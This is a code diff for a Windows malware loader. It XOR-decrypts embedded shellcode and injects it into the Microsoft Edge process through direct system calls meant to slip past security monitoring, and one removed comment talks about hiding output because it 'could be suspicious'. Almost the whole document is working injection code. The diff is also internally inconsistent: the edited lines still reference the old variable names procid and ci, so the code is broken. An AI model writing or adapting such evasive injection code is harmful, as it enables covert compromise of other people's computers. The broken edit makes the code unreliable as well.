@@ -61,7 +61,7 @@ void XOR(unsigned char* data, size_t data_len) {
 	}
 }
 
-int FindTarget(const wchar_t* procname) {
+int FindTarget(const wchar_t* target_process) {
 	PVOID buffer = NULL;
 	ULONG buffer_size = 0x10000;
 	ULONG needed_size = 0;
@@ -84,7 +84,7 @@ int FindTarget(const wchar_t* procname) {
 	int pid = 0;
 
 	do {
-		if (spi->ImageName.Buffer && wcscmp(spi->ImageName.Buffer, procname) == 0) {
+		if (spi->ImageName.Buffer && wcscmp(spi->ImageName.Buffer, target_process) == 0) {
 			pid = (int)spi->UniqueProcessId;
 			break;
 		}
@@ -97,47 +97,47 @@ int FindTarget(const wchar_t* procname) {
 
 int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
 
+	const wchar_t *target_process = L"msedge.exe";
+
+	int pid = 0;
+
 	HANDLE hThread, hProc;
 	OBJECT_ATTRIBUTES object_attributes;
+	CLIENT_ID clientId;
 
 	LPVOID remote_process_buffer = NULL;
 	LPVOID buf_pointer = &buf;
 	SIZE_T buf_len = sizeof(buf);
 
-
-	InitializeObjectAttributes(&object_attributes, NULL, 0, NULL, NULL);
-
-	const wchar_t *target_process = L"msedge.exe";
 	// find the process id
-	DWORD procid = FindTarget(target_process);
+	pid = FindTarget(target_process);
 	if (procid == 0) {
 		wprintf(L"failed to find %s process\n", target_process);
 		return 1;
 	}
-	// hide print -> Could be suspicious
-	// wprintf(L"%s process found with process id: %d\n", target_process, procid);
 
 	// decrypt the buffer
 	XOR(buf, sizeof(buf));
 
-	CLIENT_ID ci = { (HANDLE)procid, NULL };
+	clientId.UniqueProcess = (HANDLE)procid;
+	clientId.UniqueThread = 0;
 
-	// open a process handle
+	InitializeObjectAttributes(&object_attributes, NULL, 0, NULL, NULL);
+
 	Sw3NtOpenProcess(&hProc, PROCESS_ALL_ACCESS, &object_attributes, &ci);
 
-	// allocate a space in the target process
+	// Injection
 	Sw3NtAllocateVirtualMemory(hProc, &remote_process_buffer, 0, (PULONG)&buf_len, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
 
-	// write the buffer (shellcode) into the space
 	Sw3NtWriteVirtualMemory(hProc, remote_process_buffer, buf_pointer, sizeof(buf), 0);
 
-	// create and run thread in target process
 	Sw3NtCreateThreadEx(&hThread, 0x1FFFFF, NULL, hProc, (LPTHREAD_START_ROUTINE)remote_process_buffer, NULL, FALSE, NULL, NULL, NULL, NULL);
 
-	// wait the thread launched
 	Sw3NtWaitForSingleObject(hProc, FALSE, INFINITE);
 
-	// close the handle
+	Sw3NtClose(hThread);
+
+	// Close handle of the opened process
 	Sw3NtClose(hProc);
 
 	return 0;
